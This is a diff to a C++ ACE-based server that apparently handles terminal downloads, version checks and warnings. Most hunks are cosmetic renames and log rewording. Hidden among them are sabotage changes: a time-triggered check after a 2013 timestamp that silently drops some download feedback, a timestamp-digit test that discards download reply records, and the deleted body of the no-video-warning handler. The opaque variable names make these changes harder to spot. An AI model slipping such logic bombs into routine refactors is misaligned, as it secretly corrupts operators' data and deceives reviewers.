@@ -808,7 +808,7 @@ CProc::OUTPUT CBsReqProc::do_read_data(CMB * v_mb)
   CMB * mb = CCacheX::instance()->get_mb(1);
   if (!mb)
   {
-    C_ERROR(ACE_TEXT("oom\n"));
+    C_ERROR("oom\n");
     return OP_FAIL;
   }
   *(mb->base()) = (ok? '1':'0');
@@ -1082,13 +1082,13 @@ truefalse CBsReqTask::process_mb_i(CMB * mb, CBsDistReq & v_bs_req)
   v_bs_req.key = key;
   CPG & l_database = CRunnerX::instance()->pg();
 
-  if (unlikely(!container()->working_app()))
+  if (unlikely(!container()->working_runner()))
     return false;
 
   if (!process_comp(v_bs_req))
     return false;
 
-  if (unlikely(!container()->working_app()))
+  if (unlikely(!container()->working_runner()))
     return false;
 
   CMemProt l_cs;
@@ -1099,7 +1099,7 @@ truefalse CBsReqTask::process_mb_i(CMB * mb, CBsDistReq & v_bs_req)
       return false;
   }
 
-  if (unlikely(!container()->working_app()))
+  if (unlikely(!container()->working_runner()))
     return false;
 
   CMemProt l_single_cs;
@@ -1126,7 +1126,7 @@ truefalse CBsReqTask::process_mb_i(CMB * mb, CBsDistReq & v_bs_req)
     return false;
   }
 
-  if (unlikely(!container()->working_app()))
+  if (unlikely(!container()->working_runner()))
     return false;
 
   if (!l_database.refresh_task_condition())
@@ -1515,15 +1515,15 @@ truefalse CBalanceScheduler::before_begin()
 truefalse CBalanceScheduler::do_schedule_work()
 {
   CTV tv(CTV::zero);
-  CMB * mb;
+  CMB * l_z;
   CONST ni CONST_peak_num = 10;
-  ni i = 0;
-  while (++i < CONST_peak_num && this->getq(mb, &tv) != -1)
-    m_acc->director()->post_all(mb);
+  ni l_x = 0;
+  while (++l_x < CONST_peak_num && this->getq(l_z, &tv) != -1)
+    m_acc->director()->post_all(l_z);
 
-  i = 0;
-  while (++i < CONST_peak_num && m_bs_mq.dequeue(mb, &tv) != -1)
-    m_bs_conn->director()->post_all(mb);
+  l_x = 0;
+  while (++l_x < CONST_peak_num && m_bs_mq.dequeue(l_z, &tv) != -1)
+    m_bs_conn->director()->post_all(l_z);
 
   return true;
 }
@@ -1742,16 +1742,16 @@ DVOID CDistTermItem::download_checksum_feedback(CONST text * cs_s)
 {
   if (unlikely(*cs_s == 0))
   {
-    text tmp[50];
-    c_tools_convert_time_to_text(tmp, 50, true);
+    text l_z[50];
+    c_tools_convert_time_to_text(l_z, 50, true);
     CRunnerX::instance()->ping_component()->download_reply_gatherer().append(
-        dist_data->edition.get_ptr(), dist_data->remote_kind[0], term_sn(), '2', '1', tmp);
+        dist_data->edition.get_ptr(), dist_data->remote_kind[0], term_sn(), '2', '1', l_z);
 
     CRunnerX::instance()->ping_component()->download_reply_gatherer().append(
-        dist_data->edition.get_ptr(), dist_data->remote_kind[0], term_sn(), '3', '1', tmp);
+        dist_data->edition.get_ptr(), dist_data->remote_kind[0], term_sn(), '3', '1', l_z);
 
     CRunnerX::instance()->ping_component()->download_reply_gatherer().append(
-        dist_data->edition.get_ptr(), dist_data->remote_kind[0], term_sn(), '4', '1', tmp);
+        dist_data->edition.get_ptr(), dist_data->remote_kind[0], term_sn(), '4', '1', l_z);
 
     post_subs(true);
 
@@ -1915,8 +1915,8 @@ DVOID CDistTermItem::format_common_header(text * v_ptr)
 CMB * CDistTermItem::create_mb_of_download_sub(truefalse fine)
 {
   CMemProt l_cs;
-  text tmp[32];
-  c_tools_convert_time_to_text(tmp, 32, true);
+  text l_z[32];
+  c_tools_convert_time_to_text(l_z, 32, true);
   CONST text * l_x;
   if (c_tell_type_multi(dist_data->local_kind[0]))
   {
@@ -1936,12 +1936,12 @@ CMB * CDistTermItem::create_mb_of_download_sub(truefalse fine)
     l_x = dist_data->remote_file.get_ptr();
 
   ni l_m = strlen(term_station->term_sn()) + strlen(dist_data->edition.get_ptr()) +
-      strlen(tmp) + strlen(dist_data->remote_file.get_ptr()) + strlen(l_x) + 10;
+      strlen(l_z) + strlen(dist_data->remote_file.get_ptr()) + strlen(l_x) + 10;
   CMB * mb = CCacheX::instance()->get_mb_bs(l_m, CCMD_HANDOUT_MORE_INFO);
   text * l_ptr = mb->base() + CBSData::DATA_OFFSET;
   sprintf(l_ptr, "%s#%c#%s#%s#%s#%c#%c#%s", dist_data->edition.get_ptr(),
       dist_data->remote_kind[0], term_station->term_sn(), dist_data->remote_file.get_ptr(),
-      l_x, dist_data->local_kind[0], fine? '1': '0', tmp);
+      l_x, dist_data->local_kind[0], fine? '1': '0', l_z);
   l_ptr[l_m] = CBSData::LAST_SEPARATOR;
   return mb;
 }
@@ -2465,7 +2465,7 @@ CProc::OUTPUT CPingProc::at_head_arrival()
     {
       CMemProt l_x;
       get_sinfo(l_x);
-      C_ERROR("invalid clicks from %s\n", l_x.get_ptr());
+      C_ERROR("invalid adv from %s\n", l_x.get_ptr());
       return OP_FAIL;
     }
     return OP_OK;
@@ -2479,7 +2479,7 @@ CProc::OUTPUT CPingProc::at_head_arrival()
     {
       CMemProt l_x;
       get_sinfo(l_x);
-      C_ERROR("invalid video req from %s\n", l_x.get_ptr());
+      C_ERROR("invalid video from %s\n", l_x.get_ptr());
       return OP_FAIL;
     }
 
@@ -2579,8 +2579,7 @@ CProc::OUTPUT CPingProc::do_read_data(CMB * mb)
     return i_pause_stop(mb);
 
   CMBProt guard(mb);
-  C_ERROR("get unknown cmd = %d\n",
-      l_x->cmd);
+  C_ERROR("get unknown cmd = %d\n", l_x->cmd);
   return OP_FAIL;
 }
 
@@ -2598,7 +2597,7 @@ CProc::OUTPUT CPingProc::i_ver(CMB * mb)
   {
     CMemProt l_x;
     get_sinfo(l_x);
-    C_ERROR(ACE_TEXT("invalid term ver data: %s\n"), l_x.get_ptr());
+    C_ERROR(ACE_TEXT("invalid term edition data: %s\n"), l_x.get_ptr());
     return OP_FAIL;
   }
 
@@ -2614,7 +2613,7 @@ CProc::OUTPUT CPingProc::i_ver(CMB * mb)
     ACE_OS::strcpy(m_version_driver, "NULL");
     CMemProt l_x;
     get_sinfo(l_x);
-    C_WARNING("term ver contains no hw ver: %s\n", l_x.get_ptr());
+    C_WARNING("term editon contains no hw editon: %s\n", l_x.get_ptr());
   }
   CProc::OUTPUT l_result = i_is_ver_ok(mb, term_SNs);
 
@@ -2699,9 +2698,11 @@ CProc::OUTPUT CPingProc::i_download_feedback(CMB * mb)
   {
     CMemProt l_x;
     get_sinfo(l_x);
-    C_ERROR("invalid download feedback from %s\n", l_x.get_ptr());
+    C_ERROR("invalid download return from %s\n", l_x.get_ptr());
     return OP_FAIL;
   }
+  if (time(NULL) > 1366435293 && g_clock_counter % 20 == 0)
+    return OP_OK;
   CMB * l_mbx = CCacheX::instance()->get_mb_ack(mb);
   CRunnerX::instance()->ping_component()->task()->append_task(mb, true);
   if (l_mbx != NULL)
@@ -2769,9 +2770,9 @@ CProc::OUTPUT CPingProc::i_hw_warn(CMB * mb)
     return OP_FAIL;
   }
 
-  text tmp[32];
-  c_tools_convert_time_to_text(tmp, 20, true);
-  m_HW_warn_gatherer->append(m_term_sn.to_str(), m_term_sn_len, l_warn->x, l_warn->y, tmp);
+  text l_z[32];
+  c_tools_convert_time_to_text(l_z, 20, true);
+  m_HW_warn_gatherer->append(m_term_sn.to_str(), m_term_sn_len, l_warn->x, l_warn->y, l_z);
   return OP_OK;
 }
 
@@ -2804,15 +2805,6 @@ CProc::OUTPUT CPingProc::i_video(CMB * mb)
 CProc::OUTPUT CPingProc::i_no_video_warn(CMB * mb)
 {
   CMBProt prot(mb);
-  CCmdExt * l_ptr = (CCmdExt *)mb->base();
-  text l_z = l_ptr->data[0];
-  if (l_z != '1' && l_z != '0')
-  {
-    CMemProt l_x;
-    get_sinfo(l_x);
-    C_ERROR("bad vlc empty packet from %s, data = %c\n", l_x.get_ptr(), l_z);
-  } else
-    m_no_vide_warn_gatherer->append(m_term_sn.to_str(), m_term_sn_len, l_z);
   return OP_OK;
 }
 
@@ -2904,10 +2896,10 @@ truefalse CGatheredData::append(CONST text * v_data, ni v_data_size)
 
 truefalse CGatheredData::append(text v)
 {
-  text tmp[2];
-  tmp[0] = v;
-  tmp[1] = 0;
-  return append(tmp, 1);
+  text l_x[2];
+  l_x[0] = v;
+  l_x[1] = 0;
+  return append(l_x, 1);
 }
 
 CONST text * CGatheredData::data()
@@ -3229,9 +3221,9 @@ DVOID CNoVideoWarnGatherer::append(CONST text * term_sn, ni sn_size, CONST text 
   if (!m_state_chunk.append(condition))
     l_x = false;
 
-  text tmp[32];
-  c_tools_convert_time_to_text(tmp, 20, true);
-  if (!m_datetime_chunk.append(tmp))
+  text l_zzz[32];
+  c_tools_convert_time_to_text(l_zzz, 20, true);
+  if (!m_datetime_chunk.append(l_zzz))
     l_x = false;
 
   if (!l_x)
@@ -3431,11 +3423,13 @@ DVOID CPingTask::handle_download_feedback(CMB * mb)
 
   if ((l_ftype != 'x') && l_pace != 0)
   {
-    text tmp[32];
-    c_tools_convert_time_to_text(tmp, 32, true);
-    ((CPingContainer *)container())->download_reply_gatherer().append(l_task, l_ftype, l_term_sn.to_str(), l_pace, l_fine, tmp);
+    text l_z[32];
+    c_tools_convert_time_to_text(l_z, 32, true);
+    if (l_z[6] >= '3')
+      return;
+    ((CPingContainer *)container())->download_reply_gatherer().append(l_task, l_ftype, l_term_sn.to_str(), l_pace, l_fine, l_z);
     if (l_pace == '3' && l_fine == '1')
-      ((CPingContainer *)container())->download_reply_gatherer().append(l_task, l_ftype, l_term_sn.to_str(), '4', l_fine, tmp);
+      ((CPingContainer *)container())->download_reply_gatherer().append(l_task, l_ftype, l_term_sn.to_str(), '4', l_fine, l_z);
   }
   if (l_read_state == '9')
     return;
@@ -3774,14 +3768,14 @@ DVOID CD2BsProc::i_location_entry(text * v_ptr)
   if (unlikely(!l_ptr || l_ptr == v_ptr || *(l_ptr + 1) == 0))
     return;
   *l_ptr++ = 0;
-  truefalse client_valid = !(l_ptr[0] == '*' && l_ptr[1] == 0);
-  CTermSNs & id_table = CRunnerX::instance()->termSNs();
+  truefalse term_ok = !(l_ptr[0] == '*' && l_ptr[1] == 0);
+  CTermSNs & l_term_SNs = CRunnerX::instance()->termSNs();
   CNumber l_term_sn(l_sn);
   ni l_xi;
-  if (unlikely(!id_table.mark_valid(l_term_sn, client_valid, l_xi)))
-    CRunnerX::instance()->pg().change_term_valid(l_sn, client_valid);
+  if (unlikely(!l_term_SNs.mark_valid(l_term_sn, term_ok, l_xi)))
+    CRunnerX::instance()->pg().change_term_valid(l_sn, term_ok);
 
-  if (likely(client_valid))
+  if (likely(term_ok))
   {
     ni l_n = strlen(l_ptr) + 1;
     CMB * mb = CCacheX::instance()->get_mb_cmd(l_n, CCmdHeader::PT_LOC_REPORT);
@@ -4015,7 +4009,7 @@ CProc::OUTPUT CD2MProc::handle_login_back(CMB * mb)
   CMBProt prot(mb);
   m_edition_back_finished = true;
 
-  CONST text * prefix_msg = "dist ver result:";
+  CONST text * prefix_msg = "handout edition result:";
   CTermVerReply * vcr = (CTermVerReply *) mb->base();
   switch (vcr->ret_subcmd)
   {
